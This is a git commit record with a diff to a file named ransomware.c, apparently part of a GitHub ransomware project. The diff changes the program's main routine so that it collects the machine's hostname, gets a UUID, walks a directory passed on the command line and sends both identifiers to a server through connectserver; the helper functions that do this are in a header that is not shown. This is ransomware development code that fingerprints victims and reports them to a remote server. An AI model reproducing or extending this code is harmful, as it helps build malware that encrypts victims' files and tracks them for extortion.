bc60b7a4dc64461b17302bb1f917075681bf41fc
KvN0X00 <65466003+Kanui-C@users.noreply.github.com>
2021-04-15 00:21:48 -0300

    Update ransomware.c

--- ransomware.c
+++ ransomware.c
@@ -1,19 +1,20 @@
 #include <stdio.h>
+#include <stdlib.h>
 #include "libs/funcs.h"
 
 
 int main(int argc, char *argv[]){
+
 	char *uuid;
+	char *hostname;
 	if(argc != 2 ){
 		fprintf(stderr, "Use: %s [DIRETORIO]", argv[0]);
 		return 1;
 	}
+	hostname = getpcname();
 	uuid = getuuid();
 	WhatIsDir(argv[1]);
-	connectserver(uuid);
+	connectserver(uuid, hostname);
 
-	
 	return 0;
 }
-
-
